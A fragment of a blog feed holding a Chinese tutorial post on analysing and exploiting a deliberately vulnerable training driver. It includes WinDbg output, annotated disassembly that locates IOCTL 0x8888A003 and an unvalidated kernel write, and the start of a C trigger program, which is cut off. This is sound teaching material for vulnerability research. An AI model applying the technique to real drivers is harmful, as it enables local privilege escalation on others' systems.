      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
      <category term="安全审计" scheme="http://riusksk.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ExploitMe内核漏洞分析与利用</title>
    <link href="http://riusksk.github.io/2012/04/16/ExploitMe%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://riusksk.github.io/2012/04/16/ExploitMe内核漏洞分析与利用/</id>
    <published>2012-04-15T16:00:00.000Z</published>
    <updated>2016-07-07T09:10:40.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;0x01-漏洞分析：&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析：&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析：&quot;&gt;&lt;/a&gt;0x01 漏洞分析：&lt;/h3&gt;&lt;p&gt;用工具加载驱动后，开启windbg进行内核调试，先找到驱动的IoControlCode数值，由于笔者在编译时是采用test.sys作为文件名，因此使用!drvobj test 这样的命令，但源码依然是经漏洞分析技术第二版样章上的代码而修改编译的，执行命令后结果如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kd&amp;gt; !drvobj test 2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Driver object (825cef38) is for:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \Driver\test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DriverEntry:   f9032885	test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DriverStartIo: 00000000	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DriverUnload:  f90324a0	test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;AddDevice:     00000000	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Dispatch routines:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[00] IRP_MJ_CREATE                      f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[01] IRP_MJ_CREATE_NAMED_PIPE           f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[02] IRP_MJ_CLOSE                       f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[03] IRP_MJ_READ                        f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[04] IRP_MJ_WRITE                       f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[05] IRP_MJ_QUERY_INFORMATION           f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[06] IRP_MJ_SET_INFORMATION             f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[07] IRP_MJ_QUERY_EA                    f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[08] IRP_MJ_SET_EA                      f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[09] IRP_MJ_FLUSH_BUFFERS               f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0b] IRP_MJ_SET_VOLUME_INFORMATION      f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0c] IRP_MJ_DIRECTORY_CONTROL           f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0d] IRP_MJ_FILE_SYSTEM_CONTROL         f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0e] IRP_MJ_DEVICE_CONTROL              f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[10] IRP_MJ_SHUTDOWN                    f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[11] IRP_MJ_LOCK_CONTROL                f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[12] IRP_MJ_CLEANUP                     f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[13] IRP_MJ_CREATE_MAILSLOT             f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[14] IRP_MJ_QUERY_SECURITY              f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[15] IRP_MJ_SET_SECURITY                f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[16] IRP_MJ_POWER                       f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[17] IRP_MJ_SYSTEM_CONTROL              f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[18] IRP_MJ_DEVICE_CHANGE               f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[19] IRP_MJ_QUERY_QUOTA                 f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[1a] IRP_MJ_SET_QUOTA                   f90324c0	test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[1b] IRP_MJ_PNP                         804fb8a6	nt!IopInvalidDeviceRequest&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面的 test+0x4c0 就是IRP分发例程，通过对其反汇编，可以找到其中的IO控制码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kd&amp;gt; uf test+0x4c0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test+0x4c0:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324c0 8bff            mov     edi,edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324c2 55              push    ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324c3 8bec            mov     ebp,esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324c5 83ec24          sub     esp,24h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324c8 c745e400000000  mov     dword ptr [ebp-1Ch],0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324cf 8b450c          mov     eax,dword ptr [ebp+0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324d2 8b4860          mov     ecx,dword ptr [eax+60h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324d5 894df4          mov     dword ptr [ebp-0Ch],ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324d8 8b55f4          mov     edx,dword ptr [ebp-0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324db 8b4210          mov     eax,dword ptr [edx+10h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324de 8945f8          mov     dword ptr [ebp-8],eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324e1 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324e4 8b513c          mov     edx,dword ptr [ecx+3Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324e7 8955ec          mov     dword ptr [ebp-14h],edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324ea 8b45f4          mov     eax,dword ptr [ebp-0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324ed 8b4808          mov     ecx,dword ptr [eax+8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324f0 894dfc          mov     dword ptr [ebp-4],ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324f3 8b55f4          mov     edx,dword ptr [ebp-0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324f6 8b4204          mov     eax,dword ptr [edx+4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324f9 8945e8          mov     dword ptr [ebp-18h],eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324fc 8b4df4          mov     ecx,dword ptr [ebp-0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f90324ff 8b510c          mov     edx,dword ptr [ecx+0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032502 8955f0          mov     dword ptr [ebp-10h],edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032505 8b450c          mov     eax,dword ptr [ebp+0Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032508 83c018          add     eax,18h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903250b 8945e0          mov     dword ptr [ebp-20h],eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903250e 8b4de0          mov     ecx,dword ptr [ebp-20h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032511 c70100000000    mov     dword ptr [ecx],0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032517 8b55e0          mov     edx,dword ptr [ebp-20h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903251a c7420400000000  mov     dword ptr [edx+4],0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032521 8b45f0          mov     eax,dword ptr [ebp-10h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032524 8945dc          mov     dword ptr [ebp-24h],eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032527 817ddc03a08888  cmp     dword ptr [ebp-24h],8888A003h		// IO控制码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903252e 7402            je      test+0x532 (f9032532)			// IO控制码0x8888A003对应的处理过程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kd&amp;gt; u f9032532&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test+0x532:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032532 837dfc04        cmp     dword ptr [ebp-4],4		// 输入缓冲区长度&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032536 721a            jb      test+0x552 (f9032552)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032538 837de804        cmp     dword ptr [ebp-18h],4		// 输出缓冲区长度&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903253c 7214            jb      test+0x552 (f9032552)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f903253e 8b4dec          mov     ecx,dword ptr [ebp-14h]	// 输出缓冲区&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032541 8b55f8          mov     edx,dword ptr [ebp-8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032544 8b02            mov     eax,dword ptr [edx]		// 输入缓冲区&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032546 8901            mov     dword ptr [ecx],eax		// 写入地址未经验证进而引发本地提权漏洞&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面编写测试代码，源码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ShowErrMsg&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LPVOID lpMsgBuf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    DWORD dw = GetLastError(); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    FormatMessage(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FORMAT_MESSAGE_ALLOCATE_BUFFER | &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FORMAT_MESSAGE_FROM_SYSTEM,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dw,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (LPTSTR) &amp;amp;lpMsgBuf,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;系统错误：%s&quot;&lt;/span&gt;,lpMsgBuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LocalFree(lpMsgBuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   HANDLE	hDevice;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   DWORD	length = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   BOOL		ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; g_InputBuffer[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] =&lt;span class=&quot;string&quot;&gt;&quot;\x00\x00\x00\x00&quot;&lt;/span&gt;;	&lt;span class=&quot;comment&quot;&gt;//输入缓冲区指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;// 打开设备驱动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   hDevice = CreateFile(&lt;span 